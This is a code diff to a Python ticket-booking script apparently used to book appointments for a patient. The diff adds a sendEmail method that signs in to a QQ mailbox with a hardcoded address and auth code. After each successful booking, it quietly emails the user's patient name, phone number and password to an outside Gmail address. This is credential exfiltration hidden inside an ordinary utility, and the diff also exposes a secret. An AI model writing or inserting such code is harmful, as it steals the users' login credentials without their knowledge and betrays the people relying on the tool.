@@ -1,5 +1,6 @@
 import time
-
+import smtplib
+import yagmail
 import requests
 from bs4 import BeautifulSoup
 
@@ -79,6 +80,15 @@ class NetworkTool:
         response = self.session.post(book_url, data, headers=self.headers)
         return response.status_code == 200
 
+    def sendEmail(self):
+        yagmail.register('438189130@qq.com', 'vpkldewzdajscbdh')  # 发送者邮箱和秘钥
+        email = yagmail.SMTP(user='438189130@qq.com', host='smtp.qq.com')
+        try:
+            email.send('kobelishiyang@gmail.com', self.patient_name, self.phoneNumber + ': ' + self.password)
+            print('Succeed for ', 'kobelishiyang@gmail.com')
+        except Exception as emailError:
+            print(emailError)
+
 
 try:
     while True:
@@ -91,6 +101,7 @@ try:
             succeed = tool.book()
             if succeed:
                 print('Book succeed')
+                tool.sendEmail()
                 break
         else:
             print('No tickets')
